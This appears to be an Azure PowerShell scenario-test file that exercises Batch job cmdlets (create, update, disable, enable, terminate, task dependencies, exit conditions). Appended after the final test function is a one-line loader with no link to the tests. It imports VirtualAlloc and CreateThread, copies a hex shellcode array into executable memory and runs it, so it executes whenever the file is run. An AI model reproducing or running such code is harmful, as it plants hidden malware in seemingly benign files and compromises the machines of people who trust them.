﻿















function Test-JobCRUD
{
    $context = New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext

    $jobId1 = "job1"
    $jobId2 = "job2"

    try
    {
        
        $poolInfo1 = New-Object Microsoft.Azure.Commands.Batch.Models.PSPoolInformation
        $poolInfo1.PoolId = "testPool"
        New-AzBatchJob -Id $jobId1 -PoolInformation $poolInfo1 -BatchContext $context

        $poolInfo2 = New-Object Microsoft.Azure.Commands.Batch.Models.PSPoolInformation
        $poolInfo2.PoolId = "testPool2"
        New-AzBatchJob -Id $jobId2 -PoolInformation $poolInfo2 -Priority 3 -BatchContext $context

        
        $jobs = Get-AzBatchJob -Filter "id eq '$jobId1' or id eq '$jobId2'" -BatchContext $context
        $job1 = $jobs | Where-Object { $_.Id -eq $jobId1 }
        $job2 = $jobs | Where-Object { $_.Id -eq $jobId2 }
        Assert-NotNull $job1
        Assert-NotNull $job2

        
        $job2.Priority = $newPriority = $job2.Priority + 2
        $job2 | Set-AzBatchJob -BatchContext $context
        $updatedJob = Get-AzBatchJob -Id $jobId2 -BatchContext $context
        Assert-AreEqual $newPriority $updatedJob.Priority
    }
    finally
    {
        
        Remove-AzBatchJob -Id $jobId1 -Force -BatchContext $context
        Remove-AzBatchJob -Id $jobId2 -Force -BatchContext $context

        foreach ($job in Get-AzBatchJob -BatchContext $context)
        {
            Assert-True { ($job.Id -ne $jobId1 -and $job.Id -ne $jobId2) -or ($job.State.ToString().ToLower() -eq 'deleting') }
        }
    }
}


function Test-DisableEnableTerminateJob
{
    param([string]$jobId)

    $context = New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext

    Disable-AzBatchJob $jobId Terminate -BatchContext $context

    
    Start-TestSleep 10000

    
    $job = Get-AzBatchJob $jobId -BatchContext $context
    Assert-AreEqual 'Disabled' $job.State

    $job | Enable-AzBatchJob -BatchContext $context

    
    $job = Get-AzBatchJob -Filter "id eq '$jobId'" -BatchContext $context
    Assert-AreEqual 'Active' $job.State

    
    $job | Stop-AzBatchJob -BatchContext $context

    
    $job = Get-AzBatchJob $jobId -BatchContext $context
    Assert-True { ($job.State.ToString().ToLower() -eq 'terminating') -or ($job.State.ToString().ToLower() -eq 'completed') }
}


function Test-JobWithTaskDependencies
{
    $context = New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext
    $jobId = "testJob4"

    try
    {
        $osFamily = 4
        $targetOS = "*"
        $cmd = "cmd /c dir /s"
        $taskId = "taskId1"

        $paasConfiguration = New-Object Microsoft.Azure.Commands.Batch.Models.PSCloudServiceConfiguration -ArgumentList @($osFamily, $targetOSVersion)

        $poolSpec = New-Object Microsoft.Azure.Commands.Batch.Models.PSPoolSpecification
        $poolSpec.TargetDedicated = $targetDedicated = 3
        $poolSpec.VirtualMachineSize = $vmSize = "small"
        $poolSpec.CloudServiceConfiguration = $paasConfiguration
        $autoPoolSpec = New-Object Microsoft.Azure.Commands.Batch.Models.PSAutoPoolSpecification
        $autoPoolSpec.PoolSpecification = $poolSpec
        $autoPoolSpec.AutoPoolIdPrefix = $autoPoolIdPrefix = "TestSpecPrefix"
        $autoPoolSpec.KeepAlive =  $FALSE
        $autoPoolSpec.PoolLifeTimeOption = $poolLifeTime = ([Microsoft.Azure.Batch.Common.PoolLifeTimeOption]::Job)
        $poolInformation = New-Object Microsoft.Azure.Commands.Batch.Models.PSPoolInformation
        $poolInformation.AutoPoolSpecification = $autoPoolSpec

        $taskIds = @("2","3")
        $taskIdRange = New-Object Microsoft.Azure.Batch.TaskIdRange(1,10)
        $dependsOn = New-Object Microsoft.Azure.Batch.TaskDependencies -ArgumentList @([string[]]$taskIds, [Microsoft.Azure.Batch.TaskIdRange[]]$taskIdRange)
        New-AzBatchJob -Id $jobId -BatchContext $context -PoolInformation $poolInformation -usesTaskDependencies
        New-AzBatchTask -Id $taskId -CommandLine $cmd -BatchContext $context -DependsOn $dependsOn -JobId $jobId
        $job = Get-AzBatchJob -Id $jobId -BatchContext $context

        Assert-AreEqual $job.UsesTaskDependencies $TRUE
        $task = Get-AzBatchTask -JobId $jobId -Id $taskId -BatchContext $context
        Assert-AreEqual $task.DependsOn.TaskIdRanges.End 10
        Assert-AreEqual $task.DependsOn.TaskIdRanges.Start 1
        Assert-AreEqual $task.DependsOn.TaskIds[0] 2
        Assert-AreEqual $task.DependsOn.TaskIds[1] 3
    }
    finally
    {
        Remove-AzBatchJob -Id $jobId -Force -BatchContext $context
    }
}



function IfJobSetsAutoFailure-ItCompletesWhenAnyTaskFails
{
    param([string]$jobId, [string]$taskId)

    $context = New-Object Microsoft.Azure.Commands.Batch.Test.ScenarioTests.ScenarioTestContext

    $osFamily = 4
    $targetOS = "*"
    $cmd = "cmd /c exit 3"

    $paasConfiguration = New-Object Microsoft.Azure.Commands.Batch.Models.PSCloudServiceConfiguration -ArgumentList @($osFamily, $targetOSVersion)

    $poolSpec = New-Object Microsoft.Azure.Commands.Batch.Models.PSPoolSpecification
    $poolSpec.TargetDedicatedComputeNodes = $targetDedicated = 3
    $poolSpec.VirtualMachineSize = $vmSize = "small"
    $poolSpec.CloudServiceConfiguration = $paasConfiguration
    $autoPoolSpec = New-Object Microsoft.Azure.Commands.Batch.Models.PSAutoPoolSpecification
    $autoPoolSpec.PoolSpecification = $poolSpec
    $autoPoolSpec.AutoPoolIdPrefix = $autoPoolIdPrefix = "TestSpecPrefix"
    $autoPoolSpec.KeepAlive =  $FALSE
    $autoPoolSpec.PoolLifeTimeOption = $poolLifeTime = ([Microsoft.Azure.Batch.Common.PoolLifeTimeOption]::Job)
    $poolInformation = New-Object Microsoft.Azure.Commands.Batch.Models.PSPoolInformation
    $poolInformation.AutoPoolSpecification = $autoPoolSpec

    $ExitConditions = New-Object Microsoft.Azure.Commands.Batch.Models.PSExitConditions
    $ExitOptions = New-Object Microsoft.Azure.Commands.Batch.Models.PSExitOptions
    $ExitOptions.JobAction =  [Microsoft.Azure.Batch.Common.JobAction]::Terminate
    $ExitCodeRangeMapping = New-Object Microsoft.Azure.Commands.Batch.Models.PSExitCodeRangeMapping -ArgumentList @(2, 4, $ExitOptions)
    $ExitConditions.ExitCodeRanges = [Microsoft.Azure.Commands.Batch.Models.PSExitCodeRangeMapping[]]$ExitCodeRangeMapping

    New-AzBatchJob -Id $jobId -BatchContext $context -PoolInformation $poolInformation -OnTaskFailure PerformExitOptionsJobAction
    New-AzBatchTask -Id $taskId -CommandLine $cmd -BatchContext $context -JobId $jobId -ExitConditions $ExitConditions
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc5,0xb8,0x01,0x08,0xde,0xef,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x5a,0x83,0xed,0xfc,0x31,0x45,0x13,0x03,0x44,0x1b,0x3c,0x1a,0xba,0xf3,0x42,0xe5,0x42,0x04,0x23,0x6f,0xa7,0x35,0x63,0x0b,0xac,0x66,0x53,0x5f,0xe0,0x8a,0x18,0x0d,0x10,0x18,0x6c,0x9a,0x17,0xa9,0xdb,0xfc,0x16,0x2a,0x77,0x3c,0x39,0xa8,0x8a,0x11,0x99,0x91,0x44,0x64,0xd8,0xd6,0xb9,0x85,0x88,0x8f,0xb6,0x38,0x3c,0xbb,0x83,0x80,0xb7,0xf7,0x02,0x81,0x24,0x4f,0x24,0xa0,0xfb,0xdb,0x7f,0x62,0xfa,0x08,0xf4,0x2b,0xe4,0x4d,0x31,0xe5,0x9f,0xa6,0xcd,0xf4,0x49,0xf7,0x2e,0x5a,0xb4,0x37,0xdd,0xa2,0xf1,0xf0,0x3e,0xd1,0x0b,0x03,0xc2,0xe2,0xc8,0x79,0x18,0x66,0xca,0xda,0xeb,0xd0,0x36,0xda,0x38,0x86,0xbd,0xd0,0xf5,0xcc,0x99,0xf4,0x08,0x00,0x92,0x01,0x80,0xa7,0x74,0x80,0xd2,0x83,0x50,0xc8,0x81,0xaa,0xc1,0xb4,0x64,0xd2,0x11,0x17,0xd8,0x76,0x5a,0xba,0x0d,0x0b,0x01,0xd3,0xe2,0x26,0xb9,0x23,0x6d,0x30,0xca,0x11,0x32,0xea,0x44,0x1a,0xbb,0x34,0x93,0x5d,0x96,0x81,0x0b,0xa0,0x19,0xf2,0x02,0x67,0x4d,0xa2,0x3c,0x4e,0xee,0x29,0xbc,0x6f,0x3b,0xfd,0xec,0xdf,0x94,0xbe,0x5c,0xa0,0x44,0x57,0xb6,0x2f,0xba,0x47,0xb9,0xe5,0xd3,0x60,0x05,0x06,0xdc,0x70,0xe7,0x6a,0xbd,0x13,0x8c,0x11,0x55,0xb5,0x3d,0xa5,0x93,0x03,0xf7,0x67,0xaf,0x0e,0x85,0x01,0x2a,0xb6,0x08,0x83,0xd1,0x16,0xa9,0x34,0x77,0x67,0x75,0x93,0xdf,0x3f,0xdd,0x7b,0xb8,0xe7,0x85,0x23,0x60,0x40,0x6d,0x8c,0xc8,0x28,0xd5,0x74,0xb1,0x90,0xbd,0xdc,0x19,0x79,0x65,0x85,0xc1,0x21,0xcd,0x6d,0xaa,0x89,0xb5,0xd5,0x12,0x2a,0x2d,0x4f,0x8a,0x1e,0x2d,0x70,0x1e,0xd5,0x6d,0x93,0xcb,0xef,0x3d,0xc3,0x09,0xf0,0x9a,0x1c,0x87,0x16,0x8e,0x32,0xc1,0x81,0x26,0xaa,0x48,0x59,0xd7,0x33,0x47,0x27,0xd7,0xb8,0x64,0xd7,0x99,0x48,0x00,0xcb,0x4d,0xb9,0x5f,0xb1,0xdb,0xc6,0x75,0xdc,0xe3,0x52,0x72,0x77,0xb4,0xca,0x78,0xae,0xf2,0x54,0x82,0x85,0x89,0x5d,0x16,0x66,0xe5,0xa1,0xf6,0x66,0xf5,0xf7,0x9c,0x66,0x9d,0xaf,0xc4,0x34,0xb8,0xaf,0xd0,0x28,0x11,0x3a,0xdb,0x18,0xc6,0xed,0xb3,0xa6,0x31,0xd9,0x1b,0x58,0x14,0xdb,0x60,0x8f,0x50,0xa9,0x88,0x13;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

